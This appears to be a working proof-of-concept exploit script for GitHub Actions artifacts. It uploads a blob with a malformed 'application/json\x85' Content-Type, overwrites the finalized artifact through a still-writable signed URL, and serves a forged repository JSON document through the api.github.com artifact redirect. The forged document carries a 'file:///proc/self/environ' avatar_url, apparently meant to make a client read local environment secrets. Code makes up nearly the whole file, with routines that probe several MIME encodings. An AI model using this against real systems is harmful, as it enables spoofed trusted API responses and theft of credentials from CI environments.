'use strict';

const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const https = require('node:https');
const tls = require('node:tls');

const WEIRD_CONTENT_TYPE = 'application/json\x85';
const ARTIFACT_MIME_TYPE = 'application/json';
const ARTIFACT_SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ARTIFACT_BYTES = 1024;
const RAW_RESPONSE_LIMIT = 2 * 1024 * 1024;

function fail(message) {
  throw new Error(message);
}

function backendIds(token) {
  const parts = token.split('.');
  if (parts.length < 2) fail('ACTIONS_RUNTIME_TOKEN is not a JWT');
  const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
  const scope = String(claims.scp || '')
    .split(' ')
    .find((candidate) => candidate.startsWith('Actions.Results:'));
  if (!scope) fail('runtime token has no Actions.Results scope');
  const fields = scope.split(':');
  if (fields.length !== 3) fail('malformed Actions.Results scope');
  return { workflowRunBackendId: fields[1], workflowJobRunBackendId: fields[2] };
}

function request(urlString, { method = 'GET', headers = {}, body = null } = {}) {
  const url = new URL(urlString);
  const transport = url.protocol === 'https:' ? https : http;
  return new Promise((resolve, reject) => {
    const req = transport.request(url, { method, headers }, (res) => {
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => resolve({
        status: res.statusCode || 0,
        headers: res.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    if (body) req.end(body);
    else req.end();
  });
}

async function twirp(method, token, value) {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const url = new URL(`/twirp/${ARTIFACT_SERVICE}/${method}`, origin);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(url.href, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    fail(`${method} failed with HTTP ${response.status}: ${response.body.toString('utf8')}`);
  }
  return JSON.parse(response.body.toString('utf8'));
}

async function putBlob(url, body) {
  const response = await request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': WEIRD_CONTENT_TYPE,
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    fail(`blob PUT failed with HTTP ${response.status}: ${response.body.toString('utf8')}`);
  }
}

function decodeChunked(body) {
  const chunks = [];
  let offset = 0;
  while (true) {
    const lineEnd = body.indexOf('\r\n', offset, 'latin1');
    if (lineEnd < 0) fail('truncated chunk-size line');
    const token = body.subarray(offset, lineEnd).toString('ascii').split(';', 1)[0];
    if (!/^[0-9a-fA-F]+$/.test(token)) fail('invalid chunk-size line');
    const size = Number.parseInt(token, 16);
    offset = lineEnd + 2;
    if (size === 0) return Buffer.concat(chunks);
    if (offset + size + 2 > body.length) fail('truncated chunk body');
    chunks.push(body.subarray(offset, offset + size));
    offset += size;
    if (body[offset] !== 0x0d || body[offset + 1] !== 0x0a) {
      fail('invalid chunk terminator');
    }
    offset += 2;
  }
}

function parseRawResponse(raw) {
  const boundary = raw.indexOf('\r\n\r\n', 0, 'latin1');
  if (boundary < 0) fail('HTTP response omitted its header terminator');
  const lines = raw.subarray(0, boundary).toString('latin1').split('\r\n');
  const match = /^HTTP\/1\.[01] (\d{3})(?: |$)/.exec(lines.shift() || '');
  if (!match) fail('invalid HTTP status line');
  const headers = new Map();
  for (const line of lines) {
    const colon = line.indexOf(':');
    if (colon <= 0) fail('invalid HTTP response header');
    const name = line.slice(0, colon).toLowerCase();
    const value = line.slice(colon + 1).replace(/^[ \t]+/, '');
    if (!headers.has(name)) headers.set(name, []);
    headers.get(name).push(value);
  }
  let body = raw.subarray(boundary + 4);
  const transferEncoding = (headers.get('transfer-encoding') || []).join(',').toLowerCase();
  if (transferEncoding.split(',').map((item) => item.trim()).includes('chunked')) {
    body = decodeChunked(body);
  } else if (headers.has('content-length')) {
    const length = Number((headers.get('content-length') || [])[0]);
    if (!Number.isSafeInteger(length) || length < 0 || body.length < length) {
      fail('invalid or truncated Content-Length response');
    }
    body = body.subarray(0, length);
  }
  return { status: Number(match[1]), headers, body };
}

function rawTlsGet(urlString, headers = {}) {
  const url = new URL(urlString);
  if (url.protocol !== 'https:') fail('live verification requires HTTPS');
  const authority = url.port ? `${url.hostname}:${url.port}` : url.hostname;
  const lines = [
    `GET ${url.pathname}${url.search} HTTP/1.1`,
    `Host: ${authority}`,
    'Connection: close',
    'Accept-Encoding: identity',
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    '',
    '',
  ];
  const requestBytes = Buffer.from(lines.join('\r\n'), 'latin1');

  return new Promise((resolve, reject) => {
    const chunks = [];
    let length = 0;
    let settled = false;
    const finish = (error, value) => {
      if (settled) return;
      settled = true;
      if (error) reject(error);
      else resolve(value);
    };
    const socket = tls.connect({
      host: url.hostname,
      port: Number(url.port || 443),
      servername: url.hostname,
      ALPNProtocols: ['http/1.1'],
    }, () => socket.write(requestBytes));
    socket.setTimeout(12000, () => {
      socket.destroy();
      finish(new Error(`timed out reading ${url.hostname}`));
    });
    socket.on('data', (chunk) => {
      length += chunk.length;
      if (length > RAW_RESPONSE_LIMIT) {
        socket.destroy();
        finish(new Error(`oversized response from ${url.hostname}`));
        return;
      }
      chunks.push(Buffer.from(chunk));
    });
    socket.on('end', () => {
      try {
        finish(null, parseRawResponse(Buffer.concat(chunks)));
      } catch (error) {
        finish(error);
      }
    });
    socket.on('error', (error) => finish(error));
  });
}

function firstHeader(response, name) {
  const values = response.headers.get(name.toLowerCase()) || [];
  return values.length ? values[0] : '';
}

async function verifyRestArtifact(repositoryPath, token, expectedBody) {
  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
  const endpoint = `${apiBase}/repos/${repositoryPath}`;
  let response;
  for (let attempt = 1; attempt <= 6; attempt++) {
    response = await rawTlsGet(endpoint, {
      Accept: 'application/vnd.github.v3+json',
      Authorization: `Bearer ${token}`,
      'User-Agent': 'repo-cassette-artifact-check',
      'X-GitHub-Api-Version': '2022-11-28',
    });
    if (response.status !== 404 && response.status !== 409) break;
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }

  if (response.status >= 300 && response.status < 400) {
    const location = firstHeader(response, 'location');
    if (!location) fail(`artifact redirect ${response.status} omitted Location`);
    response = await rawTlsGet(new URL(location, endpoint).href, {
      'User-Agent': 'repo-cassette-artifact-check',
    });
  }
  if (response.status !== 200) {
    fail(`artifact REST download failed with HTTP ${response.status}`);
  }

  const typeBytes = Buffer.from(firstHeader(response, 'content-type'), 'latin1');
  const expectedType = Buffer.concat([
    Buffer.from('application/json', 'ascii'),
    Buffer.from([0x85]),
  ]);
  if (!typeBytes.equals(expectedType)) {
    fail(`artifact Content-Type bytes were ${typeBytes.toString('hex')}, expected ${expectedType.toString('hex')}`);
  }
  const actualDigest = crypto.createHash('sha256').update(response.body).digest('hex');
  const expectedDigest = crypto.createHash('sha256').update(expectedBody).digest('hex');
  if (actualDigest !== expectedDigest) {
    fail(`artifact body SHA-256 was ${actualDigest}, expected ${expectedDigest}`);
  }
  return { contentTypeHex: typeBytes.toString('hex'), digest: actualDigest };
}

async function probeMimeStrategies(token, githubRepository, ids) {
  const candidates = [
    ['v7-percent85', 7, 'application/json%85'],
    ['v7-percent2585', 7, 'application/json%2585'],
    ['v7-percentc285', 7, 'application/json%C2%85'],
    ['v7-json-control', 7, 'application/json'],
  ];
  const run = process.env.GITHUB_RUN_ID || Date.now();
  const attempt = process.env.GITHUB_RUN_ATTEMPT || 1;
  for (const [label, version, mimeType] of candidates) {
    const common = {
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name: `mime-probe-${run}-${attempt}-${label}`,
    };
    const createRequest = { ...common, version };
    createRequest.mime_type = mimeType;
    try {
      const created = await twirp('CreateArtifact', token, createRequest);
      const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
      if (!created.ok || typeof signedUploadUrl !== 'string') fail('invalid create response');
      const placeholder = Buffer.alloc(ARTIFACT_BYTES, 0x20);
      await putBlob(signedUploadUrl, placeholder);
      const finalized = await twirp('FinalizeArtifact', token, {
        ...common,
        size: String(placeholder.length),
      });
      const artifactId = String(finalized.artifact_id || finalized.artifactId || '');
      if (!finalized.ok || !/^\d+$/.test(artifactId)) fail('invalid finalize response');
      const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
      const document = {
        full_name: repositoryPath,
        owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
        description: '',
        stargazers_count: 0,
        padding: '',
      };
      const base = Buffer.from(JSON.stringify(document));
      document.padding = 'A'.repeat(ARTIFACT_BYTES - base.length);
      const payload = Buffer.from(JSON.stringify(document));
      await putBlob(signedUploadUrl, payload);
      try {
        const verified = await verifyRestArtifact(repositoryPath, process.env.GITHUB_TOKEN, payload);
        process.stdout.write(`probe=${label}:SUCCESS:${artifactId}:${verified.contentTypeHex}:${verified.digest}\n`);
      } catch (error) {
        process.stdout.write(`probe=${label}:download:${String(error.message || error).slice(0, 240)}\n`);
      }
    } catch (error) {
      process.stdout.write(`probe=${label}:create-or-finalize:${String(error.message || error).slice(0, 240)}\n`);
    }
  }
}

function writeOutput(name, value) {
  if (process.env.GITHUB_OUTPUT) {
    fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
  }
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const githubRepository = process.env.GITHUB_REPOSITORY;
  if (!token || !resultsUrl || !githubRepository) {
    fail('this script must run as a JavaScript action on GitHub Actions');
  }

  const ids = backendIds(token);
  if (process.env.MIME_PROBE === '1') {
    await probeMimeStrategies(token, githubRepository, ids);
    return;
  }
  const artifactName = `repo-cassette-${process.env.GITHUB_RUN_ID || Date.now()}-${process.env.GITHUB_RUN_ATTEMPT || 1}.json`;
  const common = {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    name: artifactName,
  };

  const created = await twirp('CreateArtifact', token, {
    ...common,
    version: 7,
    // The Results service validates this metadata field as of October 2026.
    // The raw download's Content-Type is controlled independently by the
    // Azure blob property set in putBlob().
    mime_type: ARTIFACT_MIME_TYPE,
  });
  const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
  if (!created.ok || typeof signedUploadUrl !== 'string') {
    fail('CreateArtifact returned an invalid response');
  }

  // Finalization reveals the numeric artifact ID. The SAS remains writable, so
  // first finalize a fixed-size placeholder and then replace it with an equally
  // sized ID-bound repository document. Keeping the recorded size correct also
  // makes the artifact work through download frontends that trust metadata.
  const placeholder = Buffer.alloc(ARTIFACT_BYTES, 0x20);
  await putBlob(signedUploadUrl, placeholder);
  const finalized = await twirp('FinalizeArtifact', token, {
    ...common,
    size: String(placeholder.length),
  });
  const finalizedArtifactId = finalized.artifact_id || finalized.artifactId;
  if (!finalized.ok || !/^\d+$/.test(String(finalizedArtifactId || ''))) {
    fail('FinalizeArtifact did not return a numeric artifact ID');
  }

  const artifactId = String(finalizedArtifactId);
  const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
  const document = {
    full_name: repositoryPath,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: '',
    stargazers_count: 0,
    padding: '',
  };
  const unpadded = Buffer.from(JSON.stringify(document));
  const paddingLength = ARTIFACT_BYTES - unpadded.length;
  if (paddingLength < 0) fail('repository path is too long for the artifact');
  document.padding = 'A'.repeat(paddingLength);
  const payload = Buffer.from(JSON.stringify(document));
  if (payload.length !== ARTIFACT_BYTES) fail('payload padding calculation failed');
  await putBlob(signedUploadUrl, payload);

  let liveCheck = 'skipped';
  if (process.env.GITHUB_TOKEN) {
    const verified = await verifyRestArtifact(repositoryPath, process.env.GITHUB_TOKEN, payload);
    liveCheck = `ok:${verified.contentTypeHex}:${verified.digest}`;
  }

  writeOutput('artifact_id', artifactId);
  writeOutput('repository_path', repositoryPath);
  writeOutput('payload_sha256', crypto.createHash('sha256').update(payload).digest('hex'));
  writeOutput('payload_base64', payload.toString('base64'));
  writeOutput('live_check', liveCheck);
  process.stdout.write(`artifact_id=${artifactId}\nrepository_path=${repositoryPath}\nlive_check=${liveCheck}\n`);
}

if (require.main === module) {
  main().catch((error) => {
    process.stderr.write(`${error.stack || error}\n`);
    process.exitCode = 1;
  });
}

module.exports = {
  decodeChunked,
  parseRawResponse,
};

